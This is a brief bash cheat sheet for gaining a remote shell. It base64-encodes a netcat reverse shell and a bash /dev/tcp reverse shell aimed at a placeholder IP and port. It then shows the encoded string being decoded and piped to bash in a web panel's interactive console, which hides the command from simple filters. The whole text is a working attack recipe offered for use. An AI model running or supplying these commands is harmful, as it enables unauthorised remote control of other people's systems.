#!/bin/bash

##-------------netcat------------------------
echo -e "nc -e /bin/bash ip port" | base64 

#------------------Socket--------------------#
echo -e "bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" | base64 


##in a interactive console in web panel
echo -n "base64result" | base64 -d | bash
